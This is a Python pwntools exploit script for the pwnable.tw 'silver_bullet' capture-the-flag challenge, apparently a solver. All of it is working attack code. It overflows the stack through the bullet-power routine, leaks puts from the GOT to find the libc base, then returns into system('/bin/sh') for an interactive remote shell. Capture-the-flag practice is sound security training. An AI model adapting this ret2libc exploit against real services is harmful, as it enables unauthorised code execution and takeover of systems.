from pwn import *
#target=process('./silver_bullet',env={"LD_PRELOAD":"./libc_32.so.6"})
target=remote('chall.pwnable.tw',10103)
elf=ELF('./silver_bullet')
libc=ELF('./libc_32.so.6')

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(data):
	sla("choice :",str(1))
	sa("bullet :",data)
	
def power(data):
	sla("choice :",str(2))
	sa("bullet :",data)

def beat():
	sla("choice :",str(3))

def attack(ret,arg):
	add("A"*0x2f)
	power("A")
	payload="\xff"*3+"A"*4+p32(ret)+p32(elf.symbols["_start"])+p32(arg)
	power(payload)
	beat()
	
attack(elf.symbols["puts"],elf.got["puts"])
target.recvuntil("Oh ! You win !!\n")

libc_puts=u32(target.recv(4))
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh").next()

attack(libc_system,libc_binsh)

target.interactive()
